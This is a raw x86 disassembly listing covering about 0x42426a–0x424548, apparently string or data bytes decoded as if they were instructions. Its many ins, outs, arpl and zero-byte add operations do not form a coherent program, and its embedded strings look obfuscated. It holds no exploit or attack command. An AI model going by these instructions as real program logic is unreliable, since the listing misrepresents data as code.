  42426a:	ja     0x4242b1
  42426c:	dec    eax
  42426d:	inc    ebp
  42426e:	inc    edx
  42426f:	push   ebx
  424270:	push   ecx
  424271:	add    BYTE PTR [eax],al
  424273:	outs   dx,BYTE PTR ds:[esi]
  424274:	dec    eax
  424275:	jno    0x4242d0
  424277:	jbe    0x4242c5
  424279:	ins    BYTE PTR es:[edi],dx
  42427a:	inc    edx
  42427b:	push   0x73
  424280:	add    BYTE PTR [eax],al
  424282:	add    BYTE PTR [eax],al
  424284:	add    BYTE PTR [eax],al
  424286:	add    BYTE PTR [edx+0x44],bl
  424289:	jbe    0x4242d4
  42428b:	imul   ecx,DWORD PTR [esi+0x6e],0x66
  42428f:	ins    DWORD PTR es:[di],dx
  424291:	je     0x4242da
  424293:	ins    BYTE PTR es:[edi],dx
  424294:	jae    0x424300
  424296:	inc    esi
  424297:	ins    DWORD PTR es:[edi],dx
  424298:	je     0x4242f0
  42429a:	push   0x56584178
  42429f:	push   ebx
  4242a0:	addr16 dec edx
  4242a2:	jo     0x424316
  4242a4:	js     0x424315
  4242a6:	pop    eax
  4242a7:	dec    ebx
  4242a8:	push   esp
  4242a9:	dec    esp
  4242aa:	jns    0x4242f7
  4242ac:	js     0x424326
  4242ae:	outs   dx,BYTE PTR ds:[esi]
  4242af:	pop    ecx
  4242b0:	jae    0x424320
  4242b2:	push   0x43644448
  4242b7:	arpl   WORD PTR [edx+0x55],sp
  4242ba:	push   0x42504e67
  4242bf:	push   ebp
  4242c0:	je     0x424337
  4242c2:	addr16 dec edi
  4242c4:	dec    esp
  4242c5:	inc    edx
  4242c6:	ins    DWORD PTR es:[edi],dx
  4242c7:	inc    esi
  4242c8:	inc    esi
  4242c9:	inc    esi
  4242ca:	arpl   WORD PTR [edx+0x47],bx
  4242cd:	push   ebp
  4242ce:	inc    ebx
  4242cf:	popa   
  4242d0:	push   edx
  4242d1:	dec    esp
  4242d2:	imul   ecx,DWORD PTR [ecx+0x43],0x54706a5a
  4242d9:	push   ecx
  4242da:	push   ebx
  4242db:	imul   ebp,DWORD PTR [ebx+0x52],0x444a454e
  4242e2:	dec    edx
  4242e3:	jns    0x42434e
  4242e5:	push   edx
  4242e6:	inc    ebx
  4242e7:	jo     0x42435e
  4242e9:	imul   ecx,DWORD PTR [ebx+0x50],0x48
  4242ed:	fs add al,dl
  4242f0:	inc    edx
  4242f1:	add    BYTE PTR [eax+edx*8],al
  4242f4:	inc    edx
  4242f5:	add    BYTE PTR [eax],cl
  4242f7:	rol    BYTE PTR [edx+0x0],1
  4242fa:	or     al,0xd0
  4242fc:	inc    edx
  4242fd:	add    BYTE PTR [eax],dl
  4242ff:	rol    BYTE PTR [edx+0x0],1
  424302:	adc    al,0xd0
  424304:	inc    edx
  424305:	add    BYTE PTR [eax],bl
  424307:	rol    BYTE PTR [edx+0x0],1
  42430a:	sbb    al,0xd0
  42430c:	inc    edx
  42430d:	add    BYTE PTR [edi+0x37],al
  424310:	cmp    BYTE PTR [edi+0x4b],bl
  424313:	inc    ecx
  424314:	aaa    
  424315:	dec    ecx
  424316:	ss pop edi
  424318:	xor    BYTE PTR [eax+0x35],dl
  42431b:	dec    esi
  42431c:	add    BYTE PTR [eax+0x49],cl
  42431f:	xor    al,0x5f
  424321:	dec    esp
  424322:	inc    esp
  424323:	dec    esp
  424324:	xor    bl,BYTE PTR [edi+0x35]
  424327:	dec    eax
  424328:	xor    BYTE PTR [eax],al
  42432a:	dec    esp
  42432b:	inc    ecx
  42432c:	xor    al,0x5f
  42432e:	dec    ebx
  42432f:	pop    edx
  424330:	xor    esi,DWORD PTR [ebx]
  424332:	dec    ebp
  424333:	pop    edi
  424334:	xor    al,0x0
  424336:	pop    ecx
  424337:	inc    esi
  424338:	push   eax
  424339:	aaa    
  42433a:	xor    DWORD PTR [edx],esi
  42433c:	pop    edi
  42433d:	cmp    DWORD PTR [eax+eax*1+0x45],ecx
  424341:	xor    eax,0x33595f41
  424346:	aaa    
  424347:	push   edx
  424348:	xor    bl,BYTE PTR [edi+0x4c]
  42434b:	pop    edx
  42434c:	add    BYTE PTR [edx+0x45],cl
  42434f:	push   ebx
  424350:	xor    DWORD PTR [edi+0x43],ebx
  424353:	dec    esp
  424354:	inc    esi
  424355:	add    BYTE PTR [eax+0x58],bl
  424358:	xor    eax,0x444e515f
  42435d:	xor    eax,0x4300425f
  424362:	inc    ecx
  424363:	dec    ebx
  424364:	cmp    DWORD PTR ds:0x365f3939,esi
  42436a:	xor    al,0x42
  42436c:	pop    edi
  42436d:	pop    eax
  42436e:	push   edi
  42436f:	add    BYTE PTR [ebx+0x45],cl
  424372:	cmp    DWORD PTR ss:[edi+0x56],ebx
  424376:	xor    eax,DWORD PTR [esi+0x4c]
  424379:	add    BYTE PTR [ebp+0x53],cl
  42437c:	dec    edi
  42437d:	pop    edi
  42437e:	push   ebx
  42437f:	inc    ebx
  424380:	xor    al,0x5f
  424382:	inc    ebx
  424383:	push   ebp
  424384:	xor    eax,DWORD PTR [ecx+0x0]
  424387:	dec    esi
  424388:	inc    esi
  424389:	xor    eax,0x494f345f
  42438e:	xor    ecx,DWORD PTR [esi+0x5f]
  424391:	push   esp
  424392:	cmp    BYTE PTR [esi+0x0],dl
  424395:	pop    edx
  424396:	xor    esi,DWORD PTR [esi]
  424398:	aaa    
  424399:	pop    edi
  42439a:	xor    eax,0x5f363437
  42439f:	push   edi
  4243a0:	add    BYTE PTR [ebp+0x4a],cl
  4243a3:	push   edx
  4243a4:	pop    edi
  4243a5:	xor    DWORD PTR [edx],esi
  4243a7:	inc    ebp
  4243a8:	inc    edx
  4243a9:	ss pop edi
  4243ab:	inc    ecx
  4243ac:	dec    ebx
  4243ad:	add    BYTE PTR [edx+0x54],cl
  4243b0:	dec    edi
  4243b1:	pop    edi
  4243b2:	push   esp
  4243b3:	cmp    BYTE PTR [eax],dh
  4243b5:	inc    edi
  4243b6:	add    BYTE PTR [ecx+esi*1+0x4d],al
  4243ba:	pop    edi
  4243bb:	xor    DWORD PTR [ebp+0x57],eax
  4243be:	pop    edx
  4243bf:	cmp    BYTE PTR ss:[edi+0x38],bl
  4243c3:	inc    ebp
  4243c4:	dec    edi
  4243c5:	add    BYTE PTR [eax+0x53],cl
  4243c8:	xor    DWORD PTR [ecx],edi
  4243ca:	pop    edi
  4243cb:	dec    ebx
  4243cc:	inc    edx
  4243cd:	push   esp
  4243ce:	pop    edi
  4243cf:	push   esi
  4243d0:	add    BYTE PTR [ecx+0x49],al
  4243d3:	dec    edx
  4243d4:	pop    edi
  4243d5:	xor    eax,0x33344d4d
  4243da:	pop    edi
  4243db:	push   ecx
  4243dc:	inc    esi
  4243dd:	inc    edi
  4243de:	dec    edi
  4243df:	add    BYTE PTR [esi+0x4b],dl
  4243e2:	push   edx
  4243e3:	pop    edi
  4243e4:	inc    ebx
  4243e5:	pop    ecx
  4243e6:	xor    ebx,DWORD PTR [edi+0x35]
  4243e9:	inc    edi
  4243ea:	dec    eax
  4243eb:	xor    BYTE PTR [edx+0x0],al
  4243ee:	push   esi
  4243ef:	xor    eax,0x315f3452
  4243f4:	ss inc esp
  4243f6:	xor    eax,0x5956004a
  4243fb:	inc    ecx
  4243fc:	pop    edi
  4243fd:	push   esi
  4243fe:	push   ebp
  4243ff:	inc    ebp
  424400:	pop    edi
  424401:	xor    BYTE PTR [ecx],dh
  424403:	add    BYTE PTR [edi+0x58],al
  424406:	dec    edx
  424407:	pop    edi
  424408:	inc    edi
  424409:	inc    esi
  42440a:	push   esi
  42440b:	dec    esp
  42440c:	push   edi
  42440d:	add    BYTE PTR [edi+0x35],al
  424410:	dec    ebx
  424411:	pop    edi
  424412:	ss dec ebx
  424414:	xor    esi,DWORD PTR ds:0x33005600
  42441a:	add    BYTE PTR [edi+0x0],dl
  42441d:	xor    eax,0x5f003600
  424422:	add    BYTE PTR [ecx+0x0],bl
  424425:	dec    eax
  424426:	add    BYTE PTR [ecx+0x0],bl
  424429:	inc    ebp
  42442a:	add    BYTE PTR [eax+0x0],cl
  42442d:	add    BYTE PTR [eax],al
  42442f:	push   eax
  424430:	add    BYTE PTR [eax],dh
  424432:	add    BYTE PTR [ecx+0x0],bl
  424435:	pop    edi
  424436:	add    BYTE PTR [ecx+0x0],bl
  424439:	xor    al,BYTE PTR [eax]
  42443b:	dec    edi
  42443c:	add    BYTE PTR [ebx],dh
  42443e:	add    BYTE PTR [edi+0x0],dl
  424441:	pop    edi
  424442:	add    BYTE PTR [eax+eax*1+0x4f],al
  424446:	add    BYTE PTR [ebx+0x0],dl
  424449:	add    BYTE PTR [eax],al
  42444b:	dec    ebp
  42444c:	add    BYTE PTR [esi+0x0],dl
  42444f:	push   esp
  424450:	add    BYTE PTR [edi+0x0],bl
  424453:	inc    edx
  424454:	add    BYTE PTR [edx+0x0],dl
  424457:	xor    al,0x0
  424459:	pop    edi
  42445a:	add    BYTE PTR [ecx+0x0],al
  42445d:	push   esp
  42445e:	add    BYTE PTR [edx+0x0],dl
  424461:	pop    edi
  424462:	add    BYTE PTR [edi+0x0],cl
  424465:	xor    eax,DWORD PTR [eax]
  424467:	inc    edx
  424468:	add    BYTE PTR [eax],al
  42446a:	add    BYTE PTR [esi+0x0],cl
  42446d:	cmp    BYTE PTR [eax],al
  42446f:	push   eax
  424470:	add    BYTE PTR [eax],dh
  424472:	add    BYTE PTR [edi+0x0],bl
  424475:	push   edx
  424476:	add    BYTE PTR [edi+0x0],al
  424479:	inc    edx
  42447a:	add    BYTE PTR [eax],bh
  42447c:	add    BYTE PTR [eax+eax*1],dh
  42447f:	pop    edi
  424480:	add    BYTE PTR [edi+0x0],cl
  424483:	push   eax
  424484:	add    BYTE PTR [esi],dh
  424486:	add    BYTE PTR [eax],al
  424488:	add    BYTE PTR [edx+0x0],bl
  42448b:	pop    eax
  42448c:	add    BYTE PTR [ecx],dh
  42448e:	add    BYTE PTR [eax],bh
  424490:	add    BYTE PTR [edi+0x0],bl
  424493:	push   edi
  424494:	add    BYTE PTR [edx+0x0],dl
  424497:	dec    ebx
  424498:	add    BYTE PTR [edi+0x0],bl
  42449b:	inc    esp
  42449c:	add    BYTE PTR [esi],dh
  42449e:	add    BYTE PTR [ecx],bh
  4244a0:	add    BYTE PTR [esi],dh
  4244a2:	add    BYTE PTR [esi+0x0],dl
  4244a5:	add    BYTE PTR [eax],al
  4244a7:	push   ebp
  4244a8:	add    BYTE PTR [eax],dh
  4244aa:	add    BYTE PTR [eax+eax*1+0x5f],al
  4244ae:	add    BYTE PTR [edx+0x0],dl
  4244b1:	dec    ecx
  4244b2:	add    BYTE PTR [edi+0x0],cl
  4244b5:	xor    eax,DWORD PTR [eax]
  4244b7:	xor    eax,0x34005f00
  4244bc:	add    BYTE PTR [edi+0x0],cl
  4244bf:	pop    ecx
  4244c0:	add    BYTE PTR [eax],al
  4244c2:	add    BYTE PTR [eax+eax*1+0x31],cl
  4244c6:	add    BYTE PTR [esi+0x0],al
  4244c9:	pop    edi
  4244ca:	add    BYTE PTR [ebp+0x0],cl
  4244cd:	dec    ebp
  4244ce:	add    BYTE PTR [eax],bh
  4244d0:	add    BYTE PTR [esi],dh
  4244d2:	add    BYTE PTR [edx+0x0],al
  4244d5:	dec    esp
  4244d6:	add    BYTE PTR [eax],al
  4244d8:	add    BYTE PTR [edx+0x0],al
  4244db:	xor    eax,0x5f003500
  4244e0:	add    BYTE PTR [eax+0x0],bl
  4244e3:	inc    esp
  4244e4:	add    BYTE PTR [edi+0x0],cl
  4244e7:	inc    ecx
  4244e8:	add    BYTE PTR [eax+eax*1],dh
  4244eb:	add    BYTE PTR [eax],al
  4244ed:	push   ecx
  4244ee:	add    BYTE PTR [eax],bh
  4244f0:	add    BYTE PTR [ecx+0x0],dl
  4244f3:	pop    edi
  4244f4:	add    BYTE PTR [eax+eax*1+0x31],dl
  4244f8:	add    BYTE PTR [ecx],dh
  4244fa:	add    BYTE PTR [eax],bh
  4244fc:	add    BYTE PTR [edi+0x0],bl
  4244ff:	aaa    
  424500:	add    BYTE PTR [edx+0x0],al
  424503:	add    BYTE PTR [eax],al
  424505:	push   edx
  424506:	add    BYTE PTR [ecx],bh
  424508:	add    BYTE PTR [esi+0x0],dl
  42450b:	pop    edi
  42450c:	add    BYTE PTR [eax+eax*1],dh
  42450f:	push   edx
  424510:	add    BYTE PTR [ecx+0x0],bl
  424513:	pop    edi
  424514:	add    BYTE PTR [eax],bh
  424516:	add    BYTE PTR [eax],dh
  424518:	add    BYTE PTR [edx+0x0],bl
  42451b:	add    BYTE PTR [eax],al
  42451d:	add    BYTE PTR [eax],al
  42451f:	nop
  424520:	inc    edx
  424521:	add    BYTE PTR [eax+edx*4],al
  424524:	inc    edx
  424525:	add    BYTE PTR [eax],cl
  424527:	nop
  424528:	inc    edx
  424529:	add    BYTE PTR [eax+edx*4],cl
  42452c:	inc    edx
  42452d:	add    BYTE PTR [eax],dl
  42452f:	nop
  424530:	inc    edx
  424531:	add    BYTE PTR [eax+edx*4],dl
  424534:	inc    edx
  424535:	add    BYTE PTR [eax],bl
  424537:	nop
  424538:	inc    edx
  424539:	add    BYTE PTR [eax+edx*4],bl
  42453c:	inc    edx
  42453d:	add    BYTE PTR [eax],ah
  42453f:	nop
  424540:	inc    edx
  424541:	add    BYTE PTR [eax+edx*4],ah
  424544:	inc    edx
  424545:	add    BYTE PTR [eax],ch
  424547:	nop
  424548:	inc    edx
	...
